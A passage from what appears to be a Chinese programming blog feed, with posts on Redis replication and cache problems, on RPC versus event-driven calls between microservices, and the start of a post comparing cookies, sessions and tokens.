<li>配置中心：如果故障转移发生了，通知 client 客户端新的 master 地址。</li>
</ul>
<h2 id="主从"><a href="#主从" class="headerlink" title="主从"></a>主从</h2><p>&emsp;&emsp;提到这个，就跟我前面提到的数据持久化的 <strong>RDB</strong> 和 <strong>AOF</strong> 有着比密切的关系了。<br>&emsp;&emsp;我先说下为啥要用主从这样的架构模式，前面提到了单机 <strong>QPS</strong> 是有上限的，而且 <strong>Redis</strong> 的特性就是必须支撑读高并发的，那你一台机器又读又写，<strong>这谁顶得住啊</strong>，不当人啊！但是你让这个 master 机器去写，数据同步给别的 slave 机器，他们都拿去读，分发掉大量的请求那是不是好很多，而且扩容的时候还可以轻松实现水平扩容。</p>
<figure class="image-box">
                <img src="16e43d17dfaf05bb.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;你启动一台 slave 的时候，他会发送一个 <code>psync</code> 命令给 master ，如果是这个 slave 第一次连接到 master，他会触发一个全量复制。master 就会启动一个线程，生成 <strong>RDB</strong> 快照，还会把新的写请求都缓存在内存中，<strong>RDB</strong> 文件生成后，master 会将这个 <strong>RDB</strong> 发送给 slave 的，slave 拿到之后做的第一件事情就是写进本地的磁盘，然后加载进内存，然后 master 会把内存里面缓存的那些新命名都发给 slave。</p>
<blockquote>
<p>&emsp;&emsp;我发出来之后来自 CSDN 的网友：Jian_Shen_Zer 问了个问题：<br>&emsp;&emsp;主从同步的时候，新的 slave 进来的时候用 <strong>RDB</strong>，那之后的数据呢？有新的数据进入 master 怎么同步到 slave 啊<br>&emsp;&emsp;敖丙答：笨，<strong>AOF</strong> 嘛，增量的就像 <strong>MySQL</strong> 的 <strong>Binlog</strong> 一样，把日志增量同步给从服务就好了。</p>
</blockquote>
<h3 id="key-失效机制"><a href="#key-失效机制" class="headerlink" title="key 失效机制"></a>key 失效机制</h3><p>&emsp;&emsp;<strong>Redis</strong> 的 key 可以设置过期时间，过期后 Redis 采用主动和被动结合的失效机制，一个是和 MC 一样在访问时触发被动删除，另一种是定期的主动删除。<br>&emsp;&emsp;定期 + 惰性 + 内存淘汰  </p>
<h1 id="缓存常见问题"><a href="#缓存常见问题" class="headerlink" title="缓存常见问题"></a>缓存常见问题</h1><h2 id="缓存更新方式"><a href="#缓存更新方式" class="headerlink" title="缓存更新方式"></a>缓存更新方式</h2><p>&emsp;&emsp;这是决定在使用缓存时就该考虑的问题。<br>&emsp;&emsp;缓存的数据在数据源发生变更时需要对缓存进行更新，数据源可能是 DB，也可能是远程服务。更新的方式可以是主动更新。数据源是 DB 时，可以在更新完 DB 后就直接更新缓存。<br>&emsp;&emsp;当数据源不是 DB 而是其他远程服务，可能无法及时主动感知数据变更，这种情况下一般会选择对缓存数据设置失效期，也就是数据不一致的最大容忍时间。<br>&emsp;&emsp;这种场景下，可以选择失效更新，key 不存在或失效时先请求数据源获取最新数据，然后再次缓存，并更新失效期。<br>&emsp;&emsp;但这样做有个问题，如果依赖的远程服务在更新时出现异常，则会导致数据不可用。改进的办法是异步更新，就是当失效时先不清除数据，继续使用旧的数据，然后由异步线程去执行更新任务。这样就避免了失效瞬间的空窗期。另外还有一种纯异步更新方式，定时对数据进行分批更新。实际使用时可以根据业务场景选择更新方式。  </p>
<h2 id="数据不一致"><a href="#数据不一致" class="headerlink" title="数据不一致"></a>数据不一致</h2><p>&emsp;&emsp;第二个问题是数据不一致的问题，可以说只要使用缓存，就要考虑如何面对这个问题。缓存不一致产生的原因一般是主动更新失败，例如更新 DB 后，更新 <strong>Redis</strong> 因为网络原因请求超时；或者是异步更新失败导致。<br>&emsp;&emsp;解决的办法是，如果服务对耗时不是特别敏感可以增加重试；如果服务对耗时敏感可以通过异步补偿任务来处理失败的更新，或者短期的数据不一致不会影响业务，那么只要下次更新时可以成功，能保证最终一致性就可以。  </p>
<h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><p>&emsp;&emsp;<strong>缓存穿透</strong>，产生这个问题的原因可能是外部的恶意攻击，例如，对用户信息进行了缓存，但恶意攻击者使用不存在的用户 id 频繁请求接口，导致查询缓存不命中，然后穿透 DB 查询依然不命中。这时会有大量请求穿透缓存访问到 DB。<br>&emsp;&emsp;解决的办法如下：</p>
<ol>
<li>对不存在的用户，在缓存中保存一个空对象进行标记，防止相同 ID 再次访问 DB。不过有时这个方法并不能很好解决问题，可能导致缓存中存储大量无用数据。</li>
<li>使用 <strong>BloomFilter</strong> 过滤器，BloomFilter 的特点是存在性检测，如果 BloomFilter 中不存在，那么数据一定不存在；如果 BloomFilter 中存在，实际数据也有可能会不存在。非常适合解决这类的问题。</li>
</ol>
<h2 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h2><p>&emsp;&emsp;<strong>缓存击穿</strong>，就是某个热点数据失效时，大量针对这个数据的请求会穿透到数据源。  </p>
<p>&emsp;&emsp;解决这个问题有如下办法：</p>
<ol>
<li>可以使用互斥锁更新，保证同一个进程中针对同一个数据不会并发请求到 DB，减小 DB 压力。</li>
<li>使用随机退避方式，失效时随机 sleep 一个很短的时间，再次查询，如果失败再执行更新。</li>
<li>针对多个热点 key 同时失效的问题，可以在缓存时使用固定时间加上一个小的随机数，避免大量热点 key 同一时刻失效。</li>
</ol>
<h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><p>&emsp;&emsp;<strong>缓存雪崩</strong>，产生的原因是缓存挂掉，这时所有的请求都会穿透到 DB。  </p>
<p>&emsp;&emsp;解决方法：</p>
<ol>
<li>使用快速失败的熔断策略，减少 DB 瞬间压力；</li>
<li>使用主从模式和集群模式来尽量保证缓存服务的高可用。</li>
</ol>
<p>&emsp;&emsp;实际场景中，这两种方法会结合使用。  </p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[微服务之间的最佳调用方式]]></title>
      <url>/2019/12/19/BestCommunicationWayInMicroServices/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://blog.csdn.net/weixin_38748858/article/details/101062272" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38748858/article/details/101062272</a></p>
</blockquote>
<p>&emsp;&emsp;在微服务架构中，需要调用很多服务才能完成一项功能。服务之间如何互相调用就变成微服务架构中的一个关键问题。服务调用有两种方式，一种是 RPC 方式，另一种是事件驱动（Event-driven）方式，也就是发消息方式。消息方式是松耦合方式，比紧耦合的 RPC 方式要优越，但 RPC 方式如果用在适合的场景也有它的一席之地。</p>
<a id="more"></a>

<p><strong>耦合的种类：</strong><br>&emsp;&emsp;我们总在谈耦合，那么耦合到底意味着什么呢？</p>
<ol>
<li>时间耦合：客户端和服务端必须同时上线才能工作。发消息时，接受消息队列必须运行，但后台处理程序暂时不工作也不影响。</li>
<li>容量耦合：客户端和服务端的处理容量必须匹配。发消息时，如果后台处理能力不足也不要紧，消息队列会起到缓冲的作用。</li>
<li>接口耦合：RPC 调用有函数标签，而消息队列只是一个消息。例如买了商品之后要调用发货服务，如果是发消息，那么就只需发送一个商品被买消息。</li>
<li>发送方式耦合：RPC 是点对点方式，需要知道对方是谁，它的好处是能够传回返回值。消息既可以点对点，也可以用广播的方式，这样减少了耦合，但也使返回值比较困难。</li>
</ol>
<p>&emsp;&emsp;下面我们来逐一分析这些耦合的影响。 第一，时间耦合，对于多数应用来讲，你希望能马上得到回答，因此即使使用消息队列，后台也需要一直工作。第二，容量耦合，如果你对回复有时间要求，那么消息队列的缓冲功能作用不大，因为你希望及时响应。真正需要的是自动伸缩（Auto-scaling），它能自动调整服务端处理能力去匹配请求数量。第三和第四，接口耦合和发送方式耦合，这两个确实是 RPC 方式的软肋。  </p>
<h1 id="事件驱动（Event-Driven）方式"><a href="#事件驱动（Event-Driven）方式" class="headerlink" title="事件驱动（Event-Driven）方式"></a>事件驱动（Event-Driven）方式</h1><p>&emsp;&emsp;Martin Fowler 把事件驱动分成四种方式（<a href="https://martinfowler.com/articles/201701-event-driven.html" target="_blank" rel="noopener">What do you mean by “Event-Driven”</a>），简化之后本质上只有两种方式。 一种就是我们熟悉的的事件通知（Event Notification），另一种是事件溯源（Event Sourcing）。事件通知就是微服务之间不直接调用，而是通过发消息来进行合作。事件溯源有点像记账，它把所有的事件都记录下来，作为永久存储层，再在它的基础之上构建应用程序。实际上从应用的角度来讲，它们并不应该分属一类，它们的用途完全不同。事件通知是微服务的调用（或集成）方式，应该和 RPC 分在一起。事件溯源是一种存储数据的方式，应该和数据库分在一起。  </p>
<h2 id="事件通知（Event-Notification）方式"><a href="#事件通知（Event-Notification）方式" class="headerlink" title="事件通知（Event Notification）方式"></a>事件通知（Event Notification）方式</h2><p>&emsp;&emsp;让我们用具体的例子来看一下。在下面的例子中，有三个微服务，“Order Service”， “Customer Service” 和 “Product Service”。</p>
<figure class="image-box">
                <img src="20190920153708185.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;先说读数据，假设要创建一个 “Order”，在这个过程中需要读取 “Customer” 的数据和 “Product” 数据。如果用事件通知的方式就只能在 “Order Service” 本地也创建只读 “Customer” 和 “Product” 表，并把数据用消息的方式同步过来。<br>&emsp;&emsp;再说写数据，如果在创建一个 “Order” 时需要创建一个新的 “Customer” 或要修改 “Customer” 的信息，那么可以在界面上跳转到用户创建页面，然后在 “Customer Service” 创建用户之后再发”用户已创建“的消息，“Order Service” 接到消息，更新本地 “Customer” 表。<br>&emsp;&emsp;这并不是一个很好的使用事件驱动的例子，因为事件驱动的优点就是不同的程序之间可以独立运行，没有绑定关系。但现在 “Order Service” 需要等待 “Customer Service” 创建完了之后才能继续运行，来完成整个创建 “Order” 的工作。主要是因为 “Order” 和 “Customer” 本身从逻辑上来讲就是紧耦合关系，没有 “Customer” 你是不能创建 “Order” 的。<br>&emsp;&emsp;在这种紧耦合的情况下，也可以使用 RPC。你可以建立一个更高层级的管理程序来管理这些微服务之间的调用，这样 “Order Service” 就不必直接调用 “Customer Service” 了。当然它从本质上来讲并没有解除耦合，只是把耦合转移到了上一层，但至少现在 “order Service” 和 “Customer Service” 可以互不影响了。之所以不能根除这种紧耦合关系是因为它们在业务上是紧耦合的。<br>&emsp;&emsp;再举一个购物的例子。用户选好商品之后进行 “Checkout”，生成 “Order”，然后需要 “payment”，再从 “Inventory” 取货，最后由 “Shipment” 发货，它们每一个都是微服务。这个例子用 RPC 方式和事件通知方式都可以完成。当用 RPC 方式时，由 “Order” 服务调用其他几个服务来完成整个功能。用事件通知方式时，“Checkout” 服务完成之后发送 “Order Placed” 消息，“Payment” 服务收到消息，接收用户付款，发送 “Payment received” 消息。“Inventory” 服务收到消息，从仓库里取货，并发送 “Goods fetched” 消息。“Shipment” 服务得到消息，发送货物，并发送 “Goods shipped” 消息。</p>
<figure class="image-box">
                <img src="20190920153708514.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;对这个例子来讲，使用事件驱动是一个不错的选择，因为每个服务发消息之后它不需要任何反馈，这个消息由下一个模块接收来完成下一步动作，时间上的要求也比上一个要宽松。用事件驱动的好处是降低了耦合度，坏处是你现在不能在程序里找到整个购物过程的步骤。如果一个业务逻辑有它自己相对固定的流程和步骤，那么使用 RPC 或业务流程管理（BPM）能够更方便地管理这些流程。在这种情况下选哪种方案呢？在我看来好处和坏处是大致相当的。从技术上来讲要选事件驱动，从业务上来讲要选 RPC。不过现在越来越多的人采用事件通知作为微服务的集成方式，它似乎已经成了微服务之间的标椎调用方式。  </p>
<h2 id="事件溯源（Event-Sourcing）"><a href="#事件溯源（Event-Sourcing）" class="headerlink" title="事件溯源（Event Sourcing）"></a>事件溯源（Event Sourcing）</h2><p>&emsp;&emsp;这是一种具有颠覆性质的的设计，它把系统中所有的数据都以事件（Event）的方式记录下来，它的持久存储叫 Event Store， 一般是建立在数据库或消息队列（例如 Kafka）基础之上，并提供了对事件进行操作的接口，例如事件的读写和查询。事件溯源是由领域驱动设计（<a href="https://dddcommunity.org/book/evans_2003/" target="_blank" rel="noopener">Domain-Driven Design</a>）提出来的。DDD 中有一个很重要的概念，有界上下文（<a href="https://martinfowler.com/bliki/BoundedContext.html" target="_blank" rel="noopener">Bounded Context</a>），可以用有界上下文来划分微服务，每个有界上下文都可以是一个微服务。 下面是有界上下文的示例。下图中有两个服务 “Sales” 和 “Support”。有界上下文的一个关键是如何处理共享成员， 在图中是 “Customer” 和 “Product”。在不同的有界上下文中，共享成员的含义、用法以及他们的对象属性都会有些不同，DDD 建议这些共享成员在各自的有界上下文中都分别建自己的类（包括数据库表），而不是共享。可以通过数据同步的手段来保持数据的一致性。下面还会详细讲解。</p>
<figure class="image-box">
                <img src="201909201537097.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;事件溯源是微服务的一种存储方式，它是微服务的内部实现细节。因此你可以决定哪些微服务采用事件溯源方式，哪些不采用，而不必所有的服务都变成事件溯源的。 通常整个应用程序只有一个 Event Store， 不同的微服务都通过向 Event Store 发送和接受消息而互相通信。Event Store 内部可以分成不同的 stream（相当于消息队列中的 Topic）， 供不同的微服务中的领域实体（Domain Entity）使用。<br>&emsp;&emsp;事件溯源的一个短板是数据查询，它有两种方式来解决。第一种是直接对 stream 进行查询，这只适合 stream 比较小并且查询比较简单的情况。查询复杂的话，就要采用第二种方式，那就是建立一个只读数据库，把需要的数据放在库中进行查询。数据库中的数据通过监听 Event Store 中相关的事件来更新。<br>&emsp;&emsp;数据库存储方式只能保存当前状态，而事件溯源则存储了所有的历史状态，因而能根据需要回放到历史上任何一点的状态，具有很大优势。但它也不是一点问题都没有。第一，它的程序比较复杂，因为事件是一等公民，你必须把业务逻辑按照事件的方式整理出来，然后用事件来驱动程序。第二，如果你要想修改事件或事件的格式就比较麻烦，因为旧的事件已经存储在 Event Store 里了（事件就像日志，是只读的），没有办法再改。<br>&emsp;&emsp;由于事件溯源和事件通知表面上看起来很像，不少人都搞不清楚它们的区别。事件通知只是微服务的集成方式，程序内部是不使用事件溯源的，内部实现仍然是传统的数据库方式。只有当要与其他微服务集成时才会发消息。而在事件溯源中，事件是一等公民，可以不要数据库，全部数据都是按照事件的方式存储的。<br>&emsp;&emsp;虽然事件溯源的践行者有不同的意见，但有不少人都认为事件溯源不是微服务的集成方式，而是微服务的一种内部实现方式。因此，在一个系统中，可以某些微服务用事件溯源，另外一些微服务用数据库。当你要集成这些微服务时，你可以用事件通知的方式。注意现在有两种不同的事件需要区分开，一种是微服务的内部事件，是颗粒度比较细的，这种事件只发送到这个微服务的 stream 中，只被事件溯源使用。另一种是其他微服务也关心的，是颗粒度比较粗的，这种事件会放到另外一个或几个 stream 中，被多个微服务使用，是用来做服务之间集成的。这样做的好处是限制了事件的作用范围，减少了不相关事件对程序的干扰。详见”<a href="https://www.innoq.com/en/blog/domain-events-versus-event-sourcing/" target="_blank" rel="noopener">Domain Events vs. Event Sourcing</a>“。<br>&emsp;&emsp;事件溯源出现已经很长时间了，虽然热度一直在上升（尤其是这两年），但总的来说非常缓慢，谈论的人不少，但生产环境使用的不多。究其原因就是因为它对现在的体系结构颠覆太大，需要更改数据存储结构和程序的工作方式，还是有一定风险的。另外，微服务已经形成了一整套体系，从程序部署，服务发现与注册，到监控，服务韧性（Service Resilience），它们基本上都是针对 RPC 的，虽然也支持消息，但成熟度就差多了，因此有不少工作还是要自己来做。有意思的是 Kafka 一直在推动它作为事件驱动的工具，也取得了很大的成功。但它却没有得到事件溯源圈内的认可（详见<a href="https://stackoverflow.com/a/49868866" target="_blank" rel="noopener">这里</a>）。<br>&emsp;&emsp;多数事件溯源都使用一个叫 <a href="https://eventstore.org/" target="_blank" rel="noopener">evenstore</a> 的开源 Event Store，或是基于某个数据库的 Event Store，只有比较少的人用 Kafka 做 Event Store。 但如果用 Kafka 实现事件通知就一点问题都没有。总的来说，对大多数公司来讲事件溯源是有一定挑战的，应用时需要找到合适的场景。如果你要尝试的话，可以先拿一个微服务试水。<br>&emsp;&emsp;虽然现在事件驱动还有些生涩，但从长远来讲，还是很看好它的。像其他全新的技术一样，事件溯源需要大规模的适用场景来推动。例如容器技术就是因为微服务的流行和推动，才走向主流。事件溯源以前的适用场景只限于记账和源代码库，局限性较大。区块链可能会成为它的下一个机遇，因为它用的也是事件溯源技术。另外 AI 今后会渗入到具体程序中，使程序具有学习功能。而 RPC 模式注定没有自适应功能。事件驱动本身就具有对事件进行反应的能力，这是自我学习的基础。因此，这项技术长远来讲定会大放异彩，但短期内（3-5年）大概不会成为主流。  </p>
<h1 id="RPC方式"><a href="#RPC方式" class="headerlink" title="RPC方式"></a>RPC方式</h1><p>&emsp;&emsp;RPC 的方式就是远程函数调用，像 RESTFul，gRPC，DUBBO 都是这种方式。它一般是同步的，可以马上得到结果。在实际中，大多数应用都要求立刻得到结果，这时同步方式更有优势，代码也更简单。  </p>
<h2 id="服务网关（API-Gateway）"><a href="#服务网关（API-Gateway）" class="headerlink" title="服务网关（API Gateway）"></a>服务网关（API Gateway）</h2><p>&emsp;&emsp;熟悉微服务的人可能都知道服务网关（API Gateway）。当UI需要调用很多微服务时，它需要了解每个服务的接口，这个工作量很大。于是就用服务网关创建了一个 Facade，把几个微服务封装起来，这样 UI 就只调用服务网关就可以了，不需要去对付每一个微服务。下面是 API Gateway 示例图：</p>
<figure class="image-box">
                <img src="20190920153709420.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;服务网关（API Gateway）不是为了解决微服务之间调用的紧耦合问题，它主要是为了简化客户端的工作。其实它还可以用来降低函数之间的耦合度。 有了 API Gateway 之后，一旦服务接口修改，你可能只需要修改 API Gateway， 而不必修改每个调用这个函数的客户端，这样就减少了程序的耦合性。  </p>
<h2 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h2><p>&emsp;&emsp;可以借鉴 API Gateway 的思路来减少 RPC 调用的耦合度，例如把多个微服务组织起来形成一个完整功能的服务组合，并对外提供统一的服务接口。这种想法跟上面的 API Gateway 有些相似，都是把服务集中起来提供粗颗粒（Coarse Granular）服务，而不是细颗粒的服务（Fine Granular）。但这样建立的服务组合可能只适合一个程序使用，没有多少共享价值。因此如果有合适的场景就采用，否侧也不必强求。虽然我们不能降低 RPC 服务之间的耦合度，却可以减少这种紧耦合带来的影响。  </p>
<h2 id="降低紧耦合的影响"><a href="#降低紧耦合的影响" class="headerlink" title="降低紧耦合的影响"></a>降低紧耦合的影响</h2><p>&emsp;&emsp;什么是紧耦合的主要问题呢？就是客户端和服务端的升级不同步。服务端总是先升级，客户端可能有很多，如果要求它们同时升级是不现实的。它们有各自的部署时间表，一般都会选择在下一次部署时顺带升级。  </p>
<p>&emsp;&emsp;一般有两个办法可以解决这个问题：</p>
<ol>
<li>同时支持多个版本：这个工作量比较大，因此大多数公司都不会采用这种方式。</li>
<li>服务端向后兼容：这是更通用的方式。例如你要加一个新功能或有些客户要求给原来的函数增加一个新的参数，但别的客户不需要这个参数。这时你只好新建一个函数，跟原来的功能差不多，只是多了一个参数。这样新旧客户的需求都能满足。它的好处是向后兼容（当然这取决于你使用的协议）。它的坏处是当以后新的客户来了，看到两个差不多的函数就糊涂了，不知道该用那个。而且时间越长越严重，你的服务端可能功能增加的不多，但相似的函数却越来越多，无法选择。</li>
</ol>
<p>&emsp;&emsp;它的解决办法就是使用一个支持向后兼容的 RPC 协议，现在最好的就是 Protobuf gRPC，尤其是在向后兼容上。它给每个服务定义了一个接口，这个接口是与编程语言无关的中性接口，然后你可以用工具生成各个语言的实现代码，供不同语言使用。函数定义的变量都有编号，变量可以是可选类型的，这样就比较好地解决了函数兼容的问题。就用上面的例子，当你要增加一个可选参数时，你就定义一个新的可选变量。由于它是可选的，原来的客户端不需要提供这个参数，因此不需要修改程序。而新的客户端可以提供这个参数。你只要在服务端能同时处理这两种情况就行了。这样服务端并没有增加新的函数，但用户的新需求满足了，而且还是向后兼容的。  </p>
<h1 id="微服务的数量有没有上限？"><a href="#微服务的数量有没有上限？" class="headerlink" title="微服务的数量有没有上限？"></a>微服务的数量有没有上限？</h1><p>&emsp;&emsp;总的来说微服务的数量不要太多，不然会有比较重的运维负担。有一点需要明确的是微服务的流行不是因为技术上的创新，而是为了满足管理上的需要。单体程序大了之后，各个模块的部署时间要求不同，对服务器的优化要求也不同，而且团队人数众多，很难协调管理。把程序拆分成微服务之后，每个团队负责几个服务，就容易管理了，而且每个团队也可以按照自己的节奏进行创新，但它给运维带来了巨大的麻烦。所以在微服务刚出来时，我一直觉得它是一个退步，弊大于利。但由于管理上的问题没有其他解决方案，只有硬着头皮上了。值得庆幸的是微服务带来的麻烦都是可解的。直到后来，微服务建立了全套的自动化体系，从程序集成到部署，从全链路跟踪到日志，以及服务检测，服务发现和注册，这样才把微服务的工作量降了下来。虽然微服务在技术上一无是处，但它的流行还是大大推动了容器技术，服务网格（Service Mesh）和全链路跟踪等新技术的发展。不过它本身在技术上还是没有发现任何优势。。直到有一天，我意识到单体程序其实性能调试是很困难的（很难分离出瓶颈点），而微服务配置了全链路跟踪之后，能很快找到症结所在。看来微服务从技术来讲也不全是缺点，总算也有好的地方。但微服务的颗粒度不宜过细，否则工作量还是太大。<br>&emsp;&emsp;一般规模的公司十几个或几十个微服务都是可以承受的，但如果有几百个甚至上千个，那么绝不是一般公司可以管理的。尽管现有的工具已经很齐全了，而且与微服务有关的整个流程也已经基本上全部自动化了，但它还是会增加很多工作。Martin Fowler几年以前建议先从单体程序开始（详见 <a href="https://martinfowler.com/bliki/MonolithFirst.html" target="_blank" rel="noopener">MonolithFirst</a>），然后再逐步把功能拆分出去，变成一个个的微服务。但是后来有人反对这个建议，他也有些松口了。如果单体程序不是太大，这是个好主意。可以用数据额库表的数量来衡量程序的大小，我见过大的单体程序有几百张表，这就太多了，很难管理。正常情况下，一个微服务可以有两、三张表到五、六张表，一般不超过十张表。但如果要减少微服务数量的话，可以把这个标准放宽到不要超过二十张表。用这个做为大致的指标来创建微程序，如果使用一段时间之后还是觉得太大了，那么再逐渐拆分。当然，按照这个标准建立的服务更像是服务组合，而不是单个的微服务。不过它会为你减少工作量。只要不影响业务部门的创新进度，这是一个不错的方案。<br>&emsp;&emsp;到底应不应该选择微服务呢？如果单体程序已经没法管理了，那么你别无选择。如果没有管理上的问题，那么微服务带给你的只有问题和麻烦。其实，一般公司都没有太多选择，只能采用微服务，不过你可以选择建立比较少的微服务。如果还是没法决定，有一个折中的方案，“内部微服务设计”。  </p>
<h2 id="内部微服务设计"><a href="#内部微服务设计" class="headerlink" title="内部微服务设计"></a>内部微服务设计</h2><p>&emsp;&emsp;这种设计表面上看起来是一个单体程序，它只有一个源代码存储仓库，一个数据库，一个部署，但在程序内部可以按照微服务的思想来进行设计。它可以分成多个模块，每个模块是一个微服务，可以由不同的团队管理。</p>
<figure class="image-box">
                <img src="20190920153709762.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;用这张图做例子。这个图里的每个圆角方块大致是一个微服务，但我们可以把它作为一个单体程序来设计，内部有五个微服务。每个模块都有自己的数据库表，它们都在一个数据库中，但模块之间不能跨数据库访问（不要建立模块之间数据库表的外键）。“User”（在 Conference Management 模块中）是一个共享的类，但在不同的模块中的名字不同，含义和用法也不同，成员也不一样（例如，在 “Customer Service” 里叫 “Customer”）。DDD（Domain-Driven Design）建议不要共享这个类，而是在每一个有界上下文（模块）中都建一个新类，并拥有新的名字。虽然它们的数据库中的数据应该大致相同，但DDD建议每一个有界上下文中都建一个新表，它们之间再进行数据同步。<br>&emsp;&emsp;这个所谓的“内部微服务设计”其实就是 DDD，但当时还没有微服务，因此外表看起来是单体程序，但内部已经是微服务的设计了。它的书在 2003 就出版了，当时就很有名。但它更偏重于业务逻辑的设计，践行起来也比较困难，因此大家谈论得很多，真正用的较少。直到十年之后，微服务出来之后，人们发现它其实内部就是微服务，而且微服务的设计需要用它的思想来指导，于是就又重新焕发了青春，而且这次更猛，已经到了每个谈论微服务的人都不得不谈论 DDD 的地步。不过一本软件书籍，在十年之后还能指导新技术的设计，非常令人钦佩。<br>&emsp;&emsp;这样设计的好处是它是一个单体程序，省去了多个微服务带来的部署、运维的麻烦。但它内部是按微服务设计的，如果以后要拆分成微服务会比较容易。至于什么时候拆分不是一个技术问题。如果负责这个单体程序的各个团队之间不能在部署时间表，服务器优化等方面达成一致，那么就需要拆分了。当然你也要应对随之而来的各种运维麻烦。内部微服务设计是一个折中的方案，如果你想试水微服务，但又不愿意冒太大风险时，这是一个不错的选择。  </p>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>&emsp;&emsp;微服务之间的调用有两种方式，RPC 和事件驱动。事件驱动是更好的方式，因为它是松耦合的。但如果业务逻辑是紧耦合的，RPC 方式也是可行的（它的好处是代码更简单），而且你还可以通过选取合适的协议（Protobuf gRPC）来降低这种紧耦合带来的危害。由于事件溯源和事件通知的相似性，很多人把两者弄混了，但它们实际上是完全不同的东西。微服务的数量不宜太多，可以先创建比较大的微服务（更像是服务组合）。如果你还是不能确定是否采用微服务架构，可以先从“内部微服务设计”开始，再逐渐拆分。  </p>
<h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>[1] <a href="https://martinfowler.com/articles/201701-event-driven.html" target="_blank" rel="noopener">What do you mean by “Event-Driven”</a><br>[2] <a href="https://dddcommunity.org/book/evans_2003/" target="_blank" rel="noopener">Domain-Driven Design</a><br>[3] <a href="https://martinfowler.com/bliki/BoundedContext.html" target="_blank" rel="noopener">BoundedContext</a><br>[4] <a href="https://www.innoq.com/en/blog/domain-events-versus-event-sourcing/" target="_blank" rel="noopener">Domain Events vs. Event Sourcing</a><br>[5] <a href="https://stackoverflow.com/a/49868866" target="_blank" rel="noopener">Using Kafka as a (CQRS) Eventstore. Good idea</a><br>[6] <a href="https://eventstore.org/" target="_blank" rel="noopener">Evenstore</a><br>[7] <a href="https://martinfowler.com/bliki/MonolithFirst.html" target="_blank" rel="noopener">MonolithFirst</a>  </p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Cookie, Session, Token 对比]]></title>
      <url>/2019/12/18/CompareCookieSessionToken/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://mp.weixin.qq.com/s/AlUN2dUKi07k9VWphLsMXA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/AlUN2dUKi07k9VWphLsMXA</a></p>
</blockquote>
<a id="more"></a>

<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>&emsp;&emsp;Cookie 是一个非常具体的东西，指的就是浏览器里面能永久存储的一种数据，仅仅是浏览器实现的一种数据存储功能。<br>&emsp;&emsp;<strong>Cookie 由服务器生成，发送给浏览器，浏览器把 Cookie 以 K/V 形式保存到某个目录下的文本文件内，下一次请求同一网站时会把该 Cookie 发送给服务器。</strong>由于 Cookie 是存在客户端上的，所以浏览器加入了一些限制确保 Cookie 不会被恶意使用，同时不会占据太多磁盘空间，所以每个域的 Cookie 数量是有限的。  </p>
<h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>&emsp;&emsp;Session 从字面上讲，就是会话。这个就类似于你和一个人交谈，你怎么知道当前和你交谈的是张三而不是李四呢？对方肯定有某种特征（长相等）表明他就是张三。<br>&emsp;&emsp;Session 也是类似的道理，服务器要知道当前发请求给自己的是谁。为了做这种区分，<strong>服务器就要给每个客户端分配不同的“身份标识”，然后客户端每次向服务器发请求的时候，都带上这个“身份标识”，服务器就知道这个请求来自于谁了。</strong>至于客户端怎么保存这个“身份标识”，可以有很多种方式，对于浏览器客户端，大家都默认采用 Cookie 的方式。<br>&emsp;&emsp;服务器使用 Session 把用户的信息临时保存在了服务器上，用户离开网站后 Session 会被销毁。这种用户信息存储方式相对 Cookie 来说更安全，可是 Session 有一个缺陷：如果 Web 服务器做了负载均衡，那么下一个操作请求到了另一台服务器的时候 Session 会丢失。  </p>
<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><p>&emsp;&emsp;<strong>Token 的引入</strong>：Token 是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token 便应运而生。<br>&emsp;&emsp;<strong>Token 的定义</strong>：Token 是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个 Token 便将此 Token 返回给客户端，以后客户端只需带上这个 Token 前来请求数据即可，无需再次带上用户名和密码。最简单的 Token 组成：uid（用户唯一的身份标识）、time（当前时间的时间戳）、sign（签名，由 Token 的前几位 + 盐以哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接 Token 请求服务器）。  </p>
